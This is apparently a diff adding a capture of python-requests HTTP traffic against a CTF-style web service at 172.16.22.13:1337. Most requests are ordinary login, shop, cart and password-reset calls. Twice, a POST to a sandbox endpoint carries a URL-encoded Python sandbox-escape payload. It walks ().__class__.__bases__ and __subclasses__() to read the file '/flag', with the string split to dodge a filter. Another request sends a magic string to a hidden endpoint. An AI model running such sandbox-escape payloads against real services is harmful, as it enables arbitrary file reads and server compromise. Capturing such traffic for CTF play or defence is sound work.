@@ -1,0 +1,134 @@
+GET /login HTTP/1.1
+Host: 172.16.22.13:1337
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: python-requests/2.19.1
+
+POST /login HTTP/1.1
+Host: 172.16.22.13:1337
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: python-requests/2.19.1
+Cookie: _xsrf=2|2878f3a5|7c3a9c41170ae5cc7bf4869285ebe7a2|1532570505
+Content-Length: 129
+Content-Type: application/x-www-form-urlencoded
+
+username=79Eafy8L&_xsrf=2%7C2878f3a5%7C7c3a9c41170ae5cc7bf4869285ebe7a2%7C1532570505&password=79Eafy8L&captcha_x=96&captcha_y=246
+
+###
+GET /user HTTP/1.1
+Host: 172.16.22.13:1337
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: python-requests/2.19.1
+Cookie: username="2|1:0|10:1532570506|8:username|12:NzlFYWZ5OEw=|4f669a5027ed979cff002f7b11d104970dc61407af617c159f47b3140443e25c"; _xsrf=2|2878f3a5|7c3a9c41170ae5cc7bf4869285ebe7a2|1532570505
+
+###
+POST /sand_box_xixi_haha HTTP/1.1
+Host: 172.16.22.13:1337
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: python-requests/2.19.1
+Cookie: username="2|1:0|10:1532570506|8:username|12:NzlFYWZ5OEw=|4f669a5027ed979cff002f7b11d104970dc61407af617c159f47b3140443e25c"; _xsrf=2|2878f3a5|7c3a9c41170ae5cc7bf4869285ebe7a2|1532570505
+Content-Length: 120
+Content-Type: application/x-www-form-urlencoded
+
+cmd=%28%29.__class__.__bases__%5B3-3%5D.__subclasses__%28%29%5B%283%2B5%29%2A5%5D%28%22%2Ffl%22%2B%22ag%22%29.read%28%29
+
+###
+GET /pass/reset HTTP/1.1
+Host: 172.16.22.13:1337
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: python-requests/2.19.1
+Cookie: username="2|1:0|10:1532570506|8:username|12:NzlFYWZ5OEw=|4f669a5027ed979cff002f7b11d104970dc61407af617c159f47b3140443e25c"; _xsrf=2|2878f3a5|7c3a9c41170ae5cc7bf4869285ebe7a2|1532570505
+
+###
+POST /pass/reset HTTP/1.1
+Host: 172.16.22.13:1337
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: python-requests/2.19.1
+Cookie: username="2|1:0|10:1532570506|8:username|12:NzlFYWZ5OEw=|4f669a5027ed979cff002f7b11d104970dc61407af617c159f47b3140443e25c"; _xsrf=2|2878f3a5|7c3a9c41170ae5cc7bf4869285ebe7a2|1532570505
+Content-Length: 117
+Content-Type: application/x-www-form-urlencoded
+
+_xsrf=2%7C5314a223%7C0756cdc76c66b44a0098d714fe87b624%7C1532570505&captcha_y=194&captcha_x=548&mail=79Eafy8L%40qvq.imGET /login HTTP/1.1
+Host: 172.16.22.13:1337
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: python-requests/2.19.1
+Cookie: username="2|1:0|10:1532570506|8:username|12:NzlFYWZ5OEw=|4f669a5027ed979cff002f7b11d104970dc61407af617c159f47b3140443e25c"; _xsrf=2|2878f3a5|7c3a9c41170ae5cc7bf4869285ebe7a2|1532570505
+
+POST /sand_box_xixi_haha HTTP/1.1
+Host: 172.16.22.13:1337
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: python-requests/2.19.1
+Cookie: username="2|1:0|10:1532570506|8:username|12:NzlFYWZ5OEw=|4f669a5027ed979cff002f7b11d104970dc61407af617c159f47b3140443e25c"; _xsrf=2|2878f3a5|7c3a9c41170ae5cc7bf4869285ebe7a2|1532570505
+Content-Length: 120
+Content-Type: application/x-www-form-urlencoded
+
+cmd=%28%29.__class__.__bases__%5B3-3%5D.__subclasses__%28%29%5B%283%2B5%29%2A5%5D%28%22%2Ffl%22%2B%22ag%22%29.read%28%29POST /xiang_xin_de_xin_shi_ni_de_mo_fa HTTP/1.1
+Host: 172.16.22.13:1337
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: python-requests/2.19.1
+Cookie: username="2|1:0|10:1532570506|8:username|12:NzlFYWZ5OEw=|4f669a5027ed979cff002f7b11d104970dc61407af617c159f47b3140443e25c"; _xsrf=2|2878f3a5|7c3a9c41170ae5cc7bf4869285ebe7a2|1532570505
+Content-Length: 36
+Content-Type: application/x-www-form-urlencoded
+
+cmd=xiang_xin_de_xin_shi_ni_de_mo_faGET /shop HTTP/1.1
+Host: 172.16.22.13:1337
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: python-requests/2.19.1
+Cookie: username="2|1:0|10:1532570506|8:username|12:NzlFYWZ5OEw=|4f669a5027ed979cff002f7b11d104970dc61407af617c159f47b3140443e25c"; _xsrf=2|2878f3a5|7c3a9c41170ae5cc7bf4869285ebe7a2|1532570505
+
+POST /shopcar/add HTTP/1.1
+Host: 172.16.22.13:1337
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: python-requests/2.19.1
+Cookie: username="2|1:0|10:1532570506|8:username|12:NzlFYWZ5OEw=|4f669a5027ed979cff002f7b11d104970dc61407af617c159f47b3140443e25c"; _xsrf=2|2878f3a5|7c3a9c41170ae5cc7bf4869285ebe7a2|1532570505
+Content-Length: 71
+Content-Type: application/x-www-form-urlencoded
+
+_xsrf=2%7C3f9a0b08%7C6bd864ec00e81d616c167e3f92091f0f%7C1532570505&id=1GET /shopcar HTTP/1.1
+Host: 172.16.22.13:1337
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: python-requests/2.19.1
+Cookie: username="2|1:0|10:1532570506|8:username|12:NzlFYWZ5OEw=|4f669a5027ed979cff002f7b11d104970dc61407af617c159f47b3140443e25c"; _xsrf=2|2878f3a5|7c3a9c41170ae5cc7bf4869285ebe7a2|1532570505; commodity_id="2|1:0|10:1532570506|12:commodity_id|4:MQ==|c1441e1e4878f70755618cc132b7a8a447dbf6dc02f6f9f74fd6a9b064b31050"
+
+GET /user/change HTTP/1.1
+Host: 172.16.22.13:1337
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: python-requests/2.19.1
+Cookie: username="2|1:0|10:1532570506|8:username|12:NzlFYWZ5OEw=|4f669a5027ed979cff002f7b11d104970dc61407af617c159f47b3140443e25c"; _xsrf=2|2878f3a5|7c3a9c41170ae5cc7bf4869285ebe7a2|1532570505; commodity_id="2|1:0|10:1532570506|12:commodity_id|4:MQ==|c1441e1e4878f70755618cc132b7a8a447dbf6dc02f6f9f74fd6a9b064b31050"
+
+POST /user/change HTTP/1.1
+Host: 172.16.22.13:1337
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: python-requests/2.19.1
+Cookie: username="2|1:0|10:1532570506|8:username|12:NzlFYWZ5OEw=|4f669a5027ed979cff002f7b11d104970dc61407af617c159f47b3140443e25c"; _xsrf=2|2878f3a5|7c3a9c41170ae5cc7bf4869285ebe7a2|1532570505; commodity_id="2|1:0|10:1532570506|12:commodity_id|4:MQ==|c1441e1e4878f70755618cc132b7a8a447dbf6dc02f6f9f74fd6a9b064b31050"
+Content-Length: 132
+Content-Type: application/x-www-form-urlencoded
+
+_xsrf=2%7Cf419c42f%7Ca05babcbcb6bd246a795b118598ad028%7C1532570505&password=79Eafy8L&old_password=79Eafy8L&password_confirm=79Eafy8L
